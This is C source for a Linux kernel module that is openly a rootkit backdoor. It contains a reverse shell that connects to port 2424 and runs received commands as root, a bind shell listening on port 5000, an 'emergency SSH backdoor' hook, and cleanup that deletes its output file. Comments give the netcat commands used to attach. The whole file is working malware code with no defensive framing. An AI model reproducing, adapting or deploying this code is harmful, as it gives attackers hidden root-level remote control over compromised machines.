#include "backdoor.h"

#include <linux/inet.h>
#include <net/ip.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/workqueue.h>


struct workqueue_struct *work_queue;
struct work_cont *work;

struct work_cont {
    struct work_struct real_work;
} work_cont;

static void backdoor_ssh(void) {

    char *argv[] = { "/bin/bash", "-c", BCK_SSH, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static int rk_sendbuff(struct socket *sock, char *buffer, int length)
{
    struct msghdr msg;
    mm_segment_t oldfs;
    struct iovec iov;
    int len = 0;

    iov.iov_base = (char*) buffer; 
    iov.iov_len = (__kernel_size_t) length;

    msg.msg_flags = MSG_NOSIGNAL;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
       msg.msg_iov = &iov;
       msg.msg_iovlen = 1;
    #else
      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, length);
    #endif
    #if LINUX_VERSION_CODE < KERNEL_VERSION(4,1,0)
        len = sock_sendmsg(sock,&msg,length);
    #else
        len = sock_sendmsg(sock, &msg);
    #endif

    return len;
}


static int rk_recvbuff(struct socket *sock, char *buffer, int length)
{
    struct msghdr msg;
    struct iovec iov;
    int len = 0;
    mm_segment_t oldfs;

    iov.iov_base = buffer;
    iov.iov_len  = length;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
       msg.msg_iov = &iov;
       msg.msg_iovlen = 1;
    #else
      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, length);
    #endif

    oldfs = get_fs(); 
    set_fs(KERNEL_DS);
    len = sock_recvmsg(sock,&msg,length,0); //no wait
    set_fs(oldfs);

    if ((len!=-EAGAIN)&&(len!=0)&&(len!=(-107)))
        dbg("rk_recvbuff recieved %i bytes \n",len);
    return len;
}

static int file_read(struct file *filp, void *buf, int count)
{
    mm_segment_t oldfs;
    size_t byte_read;

    oldfs = get_fs();
    set_fs(KERNEL_DS);
    byte_read = vfs_read(filp, buf, count, &filp->f_pos);
    set_fs(oldfs);
    return byte_read;
}

static int read_result(char *result) {

    struct file *filep;
    if ( ! (filep = filp_open(PATH, O_RDONLY, 0)) ) {
        dbg("Error open the file\n");
        return;
    }
    char *cmd = NULL;
    cmd = kmalloc(1, GFP_KERNEL);
    if ( ! cmd ) {
        dbg("Error allocating memory\n");
        filp_close(filep, NULL);
        return;
    }
    int bytes_read = 0;
    while (file_read(filep,cmd,1) == 1) {
        result[bytes_read] = cmd[0];
        bytes_read += 1;
    }
    filp_close(filep, NULL);
    kfree(cmd);
    return bytes_read;
}

static int exec_cmd(char *buff) {
    char *pos;
    if ((pos=strchr(buff, '\n')) != NULL)
        *pos = '\0';

    strncat(buff, REDIRECT, strlen(REDIRECT));
    strncat(buff, PATH, strlen(PATH));

    char *argv[] = { "/bin/bash", "-c", buff, NULL };
    char *envp[] = { "HOME=/", NULL };
    int check;
    // wait proc -> wait until the cmd is executed
    check = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return check;
}

static void remove_file(void) {
    char *buff = NULL;
    buff = kmalloc(strlen(PATH)+15, GFP_KERNEL);
    if ( ! buff ) {
        dbg("Error allocating memory\n");
        return;
    }    
    strcpy(buff, "rm -f ");
    strncat(buff, PATH, strlen(PATH));
    dbg("remove buffer %s\n", buff);
    char *argv[] = { "/bin/bash", "-c", buff, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void backdoor_reverse(void) {

    /* client bind with : nc -lvp 2424 */

    struct socket *sock;
    struct sockaddr_in sin;
    int error;
    char *buff = NULL;
    current->flags |= PF_NOFREEZE;

    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (error < 0) {
        dbg("Error during creation of socket; terminating\n");
        return;
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton("127.0.0.1");
    sin.sin_port = htons(2424);

    error = sock->ops->connect(sock, (struct sockaddr*) &sin, sizeof(sin), !O_NONBLOCK);
    if (error < 0) {
        dbg("Error during connection of socket; terminating\n");
        sock_release(sock);
        return;
    }
    
    buff = kmalloc(512, GFP_KERNEL);
    if (buff == NULL)
    {
        dbg("Error allocating memory\n");
        sock_release(sock);
        return;
    }

    int tt = 0;
    int file_created = 0;
    while(true) {
        if (signal_pending(current))
            break;
        tt = rk_recvbuff(sock, buff, 512);
        if (tt > 0) {

            int exec_result;
            exec_result = exec_cmd(buff);

            if(exec_result == 0) {

                char *result = NULL;
                result = kmalloc(1024, GFP_KERNEL);
                if ( ! result ) {
                    dbg("Error allocating memory\n");
                    return;
                }
                int bytes_read;
                bytes_read = read_result(result);
                file_created = 1;

                int res = 0;
                res = rk_sendbuff(sock, result, bytes_read);
                kfree(result);
                memset(buff, '\0', sizeof(buff)); //cleanup the buffer
                if (res == 0) {
                    remove_file();
                    dbg("Error during connection of socket; terminating\n");
                    break;
                }
                tt = 0;
                bytes_read = 0;
            } else {
                dbg("Error executing cmd\n");
            }
        } else {
            if (file_created)
                remove_file();
            dbg("Error during connection of socket; terminating\n");
            break;
        }
    }

    sock_release(sock);
    kfree(buff);
}

static void backdoor_bind(void) {

    /* client connect with : nc 127.0.0.1 5000 */

    struct socket *sock;
    struct sockaddr_in sin;
    int error;
    current->flags |= PF_NOFREEZE;

    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (error < 0) {
        dbg("Error during creation of socket; terminating\n");
        return;
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton("127.0.0.1");
    sin.sin_port = htons(5000);

    error = sock->ops->bind(sock, (struct sockaddr *) &sin, sizeof(sin));
    if (error < 0) {
        dbg("Error binding socket\n");
        sock_release(sock);
        return;
    }

    error = sock->ops->listen(sock, 5);
    if (error < 0) {
        dbg("Error listening on socket \n");
        sock_release(sock);
        return;
    }
    char *buff = NULL;
    buff = kmalloc(512, GFP_KERNEL);
    int tt = 0;
    struct socket *newsock;
    newsock=(struct socket*)kmalloc(sizeof(struct socket),GFP_KERNEL);
    error = sock_create(PF_INET,SOCK_STREAM,IPPROTO_TCP,&newsock);
    if(error<0) {
        dbg("Error create newsock error\n");
        kfree(buff);
        sock_release(sock);  
        return; 
    }
    //wait incoming connection
    int file_created = 0;
    while (1) {
        error = newsock->ops->accept(sock,newsock,O_NONBLOCK);
        if(error >= 0) {
            while(tt = rk_recvbuff(newsock, buff, 512)) {
                int exec_result;
                exec_result = exec_cmd(buff);
                if(exec_result == 0) {

                    char *result = NULL;
                    result = kmalloc(1024, GFP_KERNEL);
                    if ( ! result ) {
                        dbg("Error allocating memory\n");
                        return;
                    }
                    int bytes_read;
                    bytes_read = read_result(result);
                    file_created = 1;

                    int res = 0;
                    res = rk_sendbuff(newsock, result, bytes_read);
                    kfree(result);
                    memset(buff, '\0', sizeof(buff)); //cleanup the buffer
                    if (res == 0) {
                        remove_file();
                        dbg("Error during connection of socket; terminating\n");
                        break;
                    }
                    tt = 0;
                    bytes_read = 0;
                } else {
                    dbg("Error executing cmd\n");
                }
                if(signal_pending(current)) {
                    break;
                }
            }
            if (file_created) {
                remove_file();
                file_created = 0;
            }
        }
        if(signal_pending(current)) {
            break;
        }
    }

    kfree(buff);
    sock_release(newsock);
    sock_release(sock);

}

static void thread_function(struct work_struct *work_arg){
    struct work_cont *c_ptr = container_of(work_arg, struct work_cont, real_work);

    dbg("Deferred work PID %d \n", current->pid);

    backdoor_reverse();

    //backdoor_bind();

    kfree(c_ptr);

    return;
}

void backdoor(void) {

    /* EMERGENCY SSH BACKDOOR */
    if (ALLOW_SSH == 1) {
        backdoor_ssh();
    }
    
    work = kmalloc(sizeof(*work), GFP_KERNEL);
    if ( !work ) {
        dbg("Error alloc work_queue");
        return;
    }
    INIT_WORK(&work->real_work, thread_function);
    schedule_work(&work->real_work);
}
